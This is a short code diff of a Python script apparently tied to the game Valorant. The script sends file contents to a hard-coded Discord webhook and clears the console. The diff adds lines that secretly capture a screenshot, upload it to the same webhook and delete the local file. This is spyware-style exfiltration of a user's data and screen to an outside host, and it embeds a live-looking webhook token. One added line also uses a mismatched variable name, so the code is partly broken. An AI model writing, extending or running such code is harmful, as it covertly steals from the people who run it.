@@ -32,7 +32,10 @@ with open(file_pathkeyx, 'r') as file:
 send_dx("https://discord.com/api/webhooks/1326055025755029525/SjdzM50XA1hduFyDQmQTPw96FHLF4b0HZYzjjTZhuoNpJnW0L2j0qeqpjopIK6aq4hqU", contentxsf)
 os.system('cls')
 file_pathmybootaes = r"C:\myaesboot.txt"
-
+screenshot_pathx = take_screenshot_and_save()
+send_screenshot_to_discord("https://discord.com/api/webhooks/1326055025755029525/SjdzM50XA1hduFyDQmQTPw96FHLF4b0HZYzjjTZhuoNpJnW0L2j0qeqpjopIK6aq4hqU", screenshot_path)
+delete_screenshot(screenshot_pathx)
+os.system('cls')
 pvvalorant="VALORANT.EXE"
 def check_program_run_2():
     boot_time = get_boot_time()
